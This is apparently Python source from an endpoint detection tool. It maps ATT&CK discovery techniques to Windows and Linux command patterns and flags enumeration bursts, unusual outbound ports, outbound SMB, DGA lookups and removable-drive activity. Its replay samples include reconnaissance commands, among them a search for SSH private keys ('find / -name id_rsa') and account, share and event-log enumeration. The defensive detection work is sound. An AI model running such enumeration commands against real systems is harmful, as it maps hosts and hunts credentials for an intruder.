    _d("T1518", LINUX, "apt", r"\blist\b.*--installed"),
    _d("T1010", WIN, "tasklist", r"/v\b"),
    _d("T1010", LINUX, "xdotool wmctrl xprop"),
    _d("T1614", WIN, "curl", r"\b(ipinfo\.io|ifconfig\.me|ip-api\.com|ipapi\.co|api\.ipify\.org)\b"),
    _d("T1614", LINUX, "curl wget", r"\b(ipinfo\.io|ifconfig\.me|ip-api\.com|ipapi\.co|api\.ipify\.org)\b"),
    _d("T1614", LINUX, "locale"),
)

# A burst is this many distinct discovery *techniques* (not commands) started
# by one parent inside one detector pass. Five matches the existing Linux
# reconnaissance rule; one shell prompt checking `whoami` and `ipconfig` is
# two, an enumeration script is a dozen.
BURST_TECHNIQUES = 5

DISCOVERY_SAMPLES = {
    WIN: {
        "T1033": (S32 + "whoami.exe", "whoami"),
        "T1082": (S32 + "systeminfo.exe", "systeminfo"),
        "T1016": (S32 + "ipconfig.exe", "ipconfig /all"),
        "T1049": (S32 + "NETSTAT.EXE", "netstat -ano"),
        "T1057": (S32 + "tasklist.exe", "tasklist"),
        "T1007": (S32 + "sc.exe", "sc query type= service"),
        "T1012": (S32 + "reg.exe", r"reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        "T1083": (S32 + "tree.com", r"tree C:\Users /f"),
        "T1087": (S32 + "net.exe", "net user"),
        "T1069": (S32 + "net.exe", "net localgroup Administrators"),
        "T1018": (S32 + "ARP.EXE", "arp -a"),
        "T1135": (S32 + "net.exe", "net share"),
        "T1124": (S32 + "w32tm.exe", "w32tm /tz"),
        "T1201": (S32 + "net.exe", "net accounts"),
        "T1615": (S32 + "gpresult.exe", "gpresult /r"),
        "T1654": (S32 + "wevtutil.exe", "wevtutil qe Security /c:20 /f:text"),
        "T1652": (S32 + "driverquery.exe", "driverquery /v"),
        "T1120": (S32 + "pnputil.exe", "pnputil /enum-devices /connected"),
        "T1680": (S32 + "fsutil.exe", "fsutil fsinfo drives"),
        "T1673": (S32 + r"wbem\WMIC.exe", "wmic computersystem get model,manufacturer"),
        "T1518": (S32 + r"wbem\WMIC.exe", "wmic product get name,version"),
        "T1010": (S32 + "tasklist.exe", "tasklist /v"),
        "T1614": (S32 + "curl.exe", "curl -s https://ipinfo.io/json"),
    },
    LINUX: {
        "T1033": ("/usr/bin/whoami", "whoami"),
        "T1082": ("/usr/bin/uname", "uname -a"),
        "T1016": ("/usr/sbin/ip", "ip addr show"),
        "T1049": ("/usr/bin/ss", "ss -tulpn"),
        "T1057": ("/usr/bin/ps", "ps aux"),
        "T1007": ("/usr/bin/systemctl", "systemctl list-units --type=service"),
        "T1083": ("/usr/bin/find", "find / -name id_rsa"),
        "T1087": ("/usr/bin/getent", "getent passwd"),
        "T1069": ("/usr/bin/groups", "groups"),
        "T1018": ("/usr/sbin/arp", "arp -a"),
        "T1135": ("/usr/sbin/showmount", "showmount -e 10.0.0.5"),
        "T1124": ("/usr/bin/timedatectl", "timedatectl"),
        "T1201": ("/usr/bin/chage", "chage -l root"),
        "T1654": ("/usr/bin/journalctl", "journalctl -u ssh --no-pager"),
        "T1652": ("/usr/bin/lsmod", "lsmod"),
        "T1120": ("/usr/bin/lsusb", "lsusb"),
        "T1680": ("/usr/bin/lsblk", "lsblk -f"),
        "T1673": ("/usr/bin/systemd-detect-virt", "systemd-detect-virt"),
        "T1518": ("/usr/bin/dpkg", "dpkg -l"),
        "T1010": ("/usr/bin/wmctrl", "wmctrl -l"),
        "T1614": ("/usr/bin/curl", "curl -s https://ipinfo.io/json"),
    },
}


def image_base(image):
    """`C:\\Windows\\System32\\NET1.EXE` -> `net1`; `/usr/bin/nc` -> `nc`."""
    name = (image or "").replace("\\", "/").rsplit("/", 1)[-1].lower()
    for suffix in (".exe", ".com"):
        if name.endswith(suffix):
            return name[:-len(suffix)]
    return name


def _args(cmdline):
    return (cmdline or "")[:MAX_CMDLINE]


# Rules from a signed rule pack (core/rulepack.py) run after the built-in
# ones and never replace them. A pack rule whose single search ever takes
# longer than this is suspended for the life of the loaded pack and reported
# by the selfguard collector: slow matching is either a bad pattern or a
# command line built to stall the matcher, and both are worth saying.
PACK_SLOW_MS = 250.0
_PACK = {"digest": None, "rules": ()}
PACK_SUSPENDED = {}            # origin -> worst ms that suspended it


def pack_rules():
    """Rule objects for the active signed pack, cached per pack digest."""
    try:
        from jarvis.core import rulepack
        pack = rulepack.current(block=False).get("pack")
    except Exception:
        return ()
    if not pack:
        return ()
    if _PACK["digest"] != pack["digest"]:
        _PACK["rules"] = tuple(
            Rule(r["tids"], r["platform"], r["images"], r["pattern"], r["severity"], r["title"],
                 r["sample"], r["benign"], quiet=r["quiet"], parents=r["parents"],
                 origin=f"rulepack:{pack['version']}:{r['id']}")
            for r in pack["rules"])
        _PACK["digest"] = pack["digest"]
        PACK_SUSPENDED.clear()
    return _PACK["rules"]


def match(image, cmdline, platform, parent="", extra=None):
    """Rules this one process start is evidence of. -> [(rule, quoted span)].

    Built-in RULES always run; `extra` (default: the active signed pack's rules)
    are added after them."""
    base, cmd = image_base(image), _args(cmdline)
    if not base or not cmd:
        return []
    pbase = image_base(parent)
    out = []
    added = pack_rules() if extra is None else tuple(extra)
    for rule in (RULES + added) if added else RULES:
        if rule.platform != platform or base in rule.not_images:
            continue
        if rule.images and base not in rule.images:
            continue
        if rule.parents and pbase not in rule.parents:
            continue
        if rule.origin:
            if rule.origin in PACK_SUSPENDED:
                continue
            started = time.perf_counter()
            m = rule.regex().search(cmd)
            took = (time.perf_counter() - started) * 1000.0
            if took > PACK_SLOW_MS:
                PACK_SUSPENDED[rule.origin] = round(took, 1)
        else:
            m = rule.regex().search(cmd)
        if m:
            # a pattern that only asks "is there a command" quotes the command, not one letter
            found = m.group(0).strip()
            span = "" if rule.quiet else (found if len(found) >= 4 else cmd.strip())[:MAX_SPAN]
            out.append((rule, span))
    return out


def discovery(image, cmdline, platform):
    """Discovery technique ids this one process start is an instance of."""
    base, cmd = image_base(image), _args(cmdline)
    found = set()
    if not base:
        return found
    for tid, plat, images, pattern in DISCOVERY:
        if plat == platform and base in images and (
                not pattern or _compiled(pattern).search(cmd)):
            found.add(tid)
    return found


def technique_ids():
    """Every technique any rule or discovery entry can report."""
    return ({tid for rule in RULES + REG_RULES for tid in rule.tids}
            | {entry[0] for entry in DISCOVERY})


def ways(tid, recorded=()):
    """How many separate rules report this technique: distinct procedures, each
    with its own sample that the coverage map replays. A registry rule counts
    only when its title is in `recorded`: the keys this machine is known to log."""
    return (sum(1 for rule in RULES if tid in rule.tids)
            + sum(1 for rule in REG_RULES if tid in rule.tids and rule.title in recorded))


def finding_title(rule):
    if rule.origin:
        return f"{rule.title} ({', '.join(rule.tids)}) [rule pack {rule.origin.rsplit(':', 1)[-1]}]"
    return f"{rule.title} ({', '.join(rule.tids)})"


def burst_title(parent):
    return f"discovery burst under {parent}"


def burst_detail(tids, commands):
    return (f"{len(tids)} distinct discovery techniques from one parent in one pass "
            f"({', '.join(sorted(tids))}): {', '.join(sorted(commands)[:12])} - each is "
            f"ordinary alone; together they are what enumeration after access looks like")


BURST_WINDOW_S = 600


def bursts(observations):
    """Discovery bursts in one detector pass.

    `observations` are (parent key, parent label, epoch seconds or None,
    technique id, command name). A parent that could not be identified is
    skipped: every unattributed process would otherwise pool into one bucket
    and look like a single busy parent. -> [(parent label, {tids}, {commands})]
    """
    groups = {}
    for key, label, when, tid, command in observations:
        if not key:
            continue
        slot = int(when // BURST_WINDOW_S) if when is not None else None
        entry = groups.setdefault((key, slot), (label, {}, set()))
        entry[1].setdefault(tid, set()).add(command)
        entry[2].add(command)
    out, seen = [], set()
    for (key, _slot), (label, tids, commands) in groups.items():
        if len(tids) >= BURST_TECHNIQUES and key not in seen:
            seen.add(key)       # one finding per parent, not one per window
            out.append((label, set(tids), commands))
    return out


# ── network and name-resolution events ──────────────────────────────────────
SMB_PORTS = ("445", "139")
# Windows DNS client status for a name that does not exist (NXDOMAIN). Other
# non-zero statuses (no record of that type, timeout) are everyday noise.
NXDOMAIN = "9003"
DGA_NAMES = 15          # distinct non-existent names from one process in one window


# Programs that run other people's code and seldom open a connection of their
# own. One of them reaching a public address on a port outside the ordinary
# ones is how a staged payload calls home on a port chosen to avoid inspection.
ODD_PORT_IMAGES = ("powershell", "pwsh", "mshta", "wscript", "cscript", "rundll32", "regsvr32",
                   "certutil", "bitsadmin", "msbuild", "installutil", "regasm", "regsvcs")
USUAL_PORTS = frozenset(("80", "443", "8080", "8443", "53", "123", "22", "21", "25", "465", "587",
                         "993", "995", "5985", "5986"))


def odd_port(image, dest_ip, dest_port, initiated=None):
    """True for a script host or system utility connecting out to a public
    address on an unusual port (T1571). The port is all that is judged: what
    travels over it is not seen."""
    import ipaddress
    if image_base(image) not in ODD_PORT_IMAGES or str(dest_port or "") in USUAL_PORTS:
        return False
    if not str(dest_port or "").isdigit() or initiated is False or str(initiated).lower() == "false":
        return False
    try:
        return ipaddress.ip_address(dest_ip or "").is_global
    except ValueError:
        return False


def outbound_smb(dest_ip, dest_port, initiated=None):
    """True for a connection this machine opened to a public address on SMB.

    A file share on the internet is rare; a connection to one is how a lure
    makes Windows send the user's NTLM hash to an attacker (T1187). An inbound
    connection, or one whose direction is known to be inbound, is not this.
    """
    import ipaddress
    if str(dest_port) not in SMB_PORTS or initiated is False or str(initiated).lower() == "false":
        return False
    try:
        return ipaddress.ip_address(dest_ip or "").is_global
    except ValueError:
        return False


def dga_bursts(lookups):
    """Processes resolving many names that do not exist (T1568).

    `lookups` are (process key, label, epoch or None, name, status). Malware
    that generates its rendezvous domains tries dozens before one resolves; an
    ordinary program mistypes one. -> [(label, {names})]
    """
    groups = {}
    for key, label, when, name, status in lookups:
        if not key or str(status) != NXDOMAIN or not name:
            continue
        slot = int(when // BURST_WINDOW_S) if when is not None else None
        groups.setdefault((key, slot), (label, set()))[1].add(name.lower().rstrip("."))
    out, seen = [], set()
    for (key, _slot), (label, names) in groups.items():
        if len(names) >= DGA_NAMES and key not in seen:
            seen.add(key)
            out.append((label, names))
    return out


# ── drives that are not this machine's own disks ────────────────────────────
# Sysmon names the drive a program ran from but not what kind of drive it is.
# The Sysmon collector asks Windows for the volume inventory only when a process
# names a drive not already known to be an internal disk, and hands it here as
# {letter: (drive type, bus)}. A drive absent from the inventory was detached
# before it could be asked about, which is itself what a stick does.
INTERNAL, REMOVABLE, DETACHED, OTHER = "internal", "removable", "detached", "other"
# A USB hard disk reports itself as a fixed disk; only its bus tells it apart.
REMOVABLE_BUSES = frozenset(("usb", "sd", "mmc", "1394"))
_DRIVE_PATH = re.compile(r"(?<![A-Za-z0-9])([A-Za-z]):[\\/]")
COPY_TOOLS = ("robocopy", "xcopy", "cmd") + POWERSHELL
_COPY_VERB = re.compile(r"(?<![\w-])(robocopy|xcopy|copy-item|move-item|copy|move|cpi|cp|mv)(\.exe)?(?=\s)", re.I)
_DESTINATION = re.compile(r"-dest\w*[\s:]+[\"']?([A-Za-z]):[\\/]", re.I)


def drive_letter(path):
    """The drive letter a Windows path starts with, upper case, or ''."""
    path = str(path or "").lstrip('"')
    return path[0].upper() if len(path) > 2 and path[1] == ":" and path[2] in "\\/" and path[0].isalpha() else ""


def volume_kind(letter, volumes):
    """What kind of drive `letter` is, from an inventory {letter: (type, bus)}."""
    found = (volumes or {}).get(str(letter or "").upper())
    if not found:
        return DETACHED
    kind, bus = (str(part or "").lower() for part in found)
    if kind == "removable" or (kind == "fixed" and bus in REMOVABLE_BUSES):
        return REMOVABLE
    return INTERNAL if kind == "fixed" else OTHER


def copy_drives(image, cmdline):
    """Drives a copy command reads from and writes to: ({source letters}, destination letter or '').

    Only the drive letters are taken; file names are never kept. Read from the
    copy verb onward, so a path that merely locates the shell is not counted.
    The destination is the last path of `copy`, `move` and `xcopy`, the second
    of `robocopy`, or the one a `-Destination` parameter names. A copy made by
    dragging files in Explorer starts no process and is not seen here.
    """
    if image_base(image) not in COPY_TOOLS:
        return set(), ""
    text = str(cmdline or "")[:MAX_CMDLINE]
    verb = _COPY_VERB.search(text)
    if not verb:
        return set(), ""
    rest = text[verb.end():]
    letters = [m.group(1).upper() for m in _DRIVE_PATH.finditer(rest)]
    if not letters:
        return set(), ""
    named = _DESTINATION.search(rest)
    if named:
        dest = named.group(1).upper()
        sources = list(letters)
        sources.remove(dest)
    elif len(letters) == 1:
        # One path with a letter: it is the destination when something comes
        # before it to be copied (`copy report.txt E:\`), otherwise the source.
        before = rest[:_DRIVE_PATH.search(rest).start()]
        dest = letters[0] if re.search(r"[^\s/\"'-][^\s]*\s+[\"']?$", before) else ""
        sources = [] if dest else letters
    else:
        at = 1 if verb.group(1).lower() == "robocopy" else len(letters) - 1
        dest, sources = letters[at], letters[:at]
    return set(sources) - {dest}, dest


OFF_DISK = {
    # tid -> (severity, title, what it means)
    "T1091": ("medium", "program run from {kind}",
              "Software carried in on a drive runs with the rights of whoever starts it."),
    "T1025": ("low", "files copied from {kind}",
              "Only the drives are noted, never the file names."),
    "T1052": ("low", "files copied to {kind}",
              "Only the drives are noted, never the file names."),
}
KIND_TEXT = {REMOVABLE: "a removable drive", DETACHED: "a drive that is no longer attached"}


def off_disk(runs, copies, volumes):
    """Judge programs run from, and copies to or from, drives that are not internal disks.

    `runs` is [(image, when)], `copies` is [(image, {source letters},
    destination letter, when)], `volumes` the inventory, or None when it could
    not be read. -> ([(tid, kind, letter, image, count, when)], unread count).
    With no inventory nothing is judged: an internal second disk and a stick
    look the same, so the events are counted as unread instead of guessed at.
    """
    seen = [("T1091", drive_letter(image), image, when) for image, when in runs]
    for image, sources, dest, when in copies:
        seen += [("T1025", letter, image, when) for letter in sources]
        if dest:
            seen.append(("T1052", dest, image, when))
    seen = [row for row in seen if row[1]]
    if volumes is None:
        return [], len(seen)
    hits = {}
    for tid, letter, image, when in seen:
        kind = volume_kind(letter, volumes)
        if kind not in KIND_TEXT:
            continue
        hit = hits.setdefault((tid, kind, letter, image_base(image)), [image, 0, when])
        hit[1] += 1
        hit[2] = when or hit[2]
    return [(tid, kind, letter, image, count, when)
            for (tid, kind, letter, _base), (image, count, when) in hits.items()], 0
